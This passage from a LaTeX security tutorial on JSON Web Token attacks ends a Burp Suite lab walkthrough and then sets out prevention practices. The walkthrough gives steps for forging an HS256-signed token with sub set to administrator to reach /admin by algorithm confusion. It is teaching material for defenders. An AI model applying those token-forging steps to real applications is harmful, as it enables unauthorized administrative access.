    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFvK3l5MXdwWW1mZmdYQnhoQVVKegpISG9jQ3VKb2x3RHFxbDc1Wld1Q1EvY2IzMksydmg5bWs2R1BNOWdOTjRZL3FUVlg2N1doc04zSnZhRll3K2ZoCnZzV1EuLi4KLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"
    \end{verbatim}
    \item Click \textbf{OK} to save
\end{enumerate}

\subsubsection{Step 5: Modify and Sign the Token}

\begin{enumerate}
    \item In Burp Repeater, change the path to \texttt{/admin}
    \item Switch to \textbf{JSON Web Token} editor tab
    \item Ensure \texttt{alg} header is set to \textbf{HS256}
    \item In payload, change \texttt{sub} to \textbf{administrator}
    \item Click \textbf{Sign}
    \item Select the symmetric key you just created
    \item Ensure \textbf{Don't modify header} is selected
    \item Click \textbf{OK} and Send the request to access the admin panel
\end{enumerate}

\begin{notebox}[Key Takeaway]
Even when the public key isn't exposed, having just two valid JWTs is enough to derive the key and perform an algorithm confusion attack.
\end{notebox}

\section{How to Prevent JWT Attacks}

\subsection{Essential Security Measures}

\subsubsection{1. Use Up-to-Date Libraries}
\begin{itemize}
    \item Always use the latest version of established JWT libraries
    \item Ensure developers understand the library's security implications
    \item Modern libraries include protections, but aren't foolproof due to specification flexibility
\end{itemize}

\subsubsection{2. Robust Signature Verification}
\begin{itemize}
    \item Always verify signatures on every received JWT
    \item Account for edge-cases (unexpected algorithms, missing signatures)
    \item Never trust the \texttt{alg} parameter blindly
\end{itemize}

\subsubsection{3. Strict Header Validation}

\textbf{For \texttt{jku} (JWK Set URL):}
\begin{itemize}
    \item Maintain a strict whitelist of permitted domains
    \item Validate URLs against the whitelist before fetching
    \item Use URL parsing, not string matching, to prevent bypasses
\end{itemize}

\textbf{For \texttt{kid} (Key ID):}
\begin{itemize}
    \item Don't use user input to construct file paths
    \item If necessary, validate against a whitelist of allowed values
    \item Sanitize input to prevent path traversal (../)
    \item Use parameterized queries if \texttt{kid} references a database
\end{itemize}

\subsubsection{4. Algorithm Enforcement}
\begin{itemize}
    \item Reject \texttt{alg: none} tokens completely
    \item Don't allow algorithm switching (RS256 → HS256)
    \item Use separate verification methods for different algorithm types
\end{itemize}

\subsection{Additional Best Practices}

\subsubsection{5. Token Expiration}
\begin{itemize}
    \item Always set an \texttt{exp} (expiration) claim
    \item Use short-lived tokens (minutes/hours, not days/weeks)
    \item Implement refresh token mechanisms for longer sessions
\end{itemize}

\subsubsection{6. Secure Token Transmission}
\begin{itemize}
    \item Avoid sending tokens in URL parameters (they appear in logs)
    \item Use secure, HTTP-only cookies
    \item Always transmit over HTTPS/TLS
    \item Set appropriate cookie flags: \texttt{Secure}, \texttt{HttpOnly}, \texttt{SameSite}
\end{itemize}

\subsubsection{7. Key Management}
\begin{itemize}
    \item Use strong, unpredictable secret keys for symmetric algorithms
    \item Regularly rotate keys
    \item Store keys securely (environment variables, key management services)
    \item Use asymmetric algorithms (RS256, ES256) when possible
\end{itemize}

\begin{attackbox}[Remember]
Security is layered. Implementing all these measures provides defense-in-depth. Even if one control fails, others may still protect you.
\end{attackbox}

\subsection{Common Pitfalls to Avoid}

\begin{itemize}
    \item \textbf{Don't} trust user-controlled input for cryptographic decisions
    \item \textbf{Don't} use the same key for multiple purposes
    \item \textbf{Don't} ignore library updates and security patches
    \item \textbf{Don't} assume JWTs are encrypted (they're just encoded)
    \item \textbf{Don't} accept tokens without signature verification
    \item \textbf{Don't} use predictable secrets or keys
\end{itemize}

\begin{notebox}[Final Thought]
JWTs are a tool, not a silver bullet. Understanding their security implications is essential for building secure applications. When in doubt, follow the principle of least privilege and validate everything.
\end{notebox}

\end{document}